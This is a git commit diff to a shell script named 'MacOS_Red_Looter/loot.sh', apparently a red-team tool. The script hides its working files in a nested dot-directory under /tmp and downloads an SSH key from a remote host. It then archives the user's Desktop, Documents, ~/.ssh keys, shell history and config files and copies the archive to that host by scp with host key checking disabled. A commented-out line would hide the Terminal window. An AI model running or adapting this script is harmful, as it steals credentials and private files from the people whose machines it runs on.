cf7d6e4f5c21565b8f7301880b4a9f559dd2b1a5
un1x01d <>
2022-08-19 00:33:47 -0400

    improve script

--- MacOS_Red_Looter/loot.sh
+++ MacOS_Red_Looter/loot.sh
@@ -1,10 +1,13 @@
 #!/bin/bash
 
-# osascript -e 'tell application "Terminal" to set bounds of front window to {3000, 2000, 10, 10}'
+# osascript -e 'tell application "Terminal" to set boounds of front window to {3000, 2000, 10, 10}'
 
-mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s && chmod 600 /tmp/.s/.t/.e/.a/.l/.s
+LOOT="~/Desktop ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh*"
+
+mkdir -p /tmp/.s/.t/.e/.a/.l && curl -s http://192.168.1.216/sh -o /tmp/.s/.t/.e/.a/.l/.s 
+chmod 600 /tmp/.s/.t/.e/.a/.l/.s
 
 cd /tmp/.s/.t/.e/.a/.l
-tar cfz .loot.tgz ~/Desktop ~/Documents ~/.ssh ~/.bash* ~/.config ~/.zsh* 
+tar cfz .loot.tgz ${LOOT}
 
 scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/
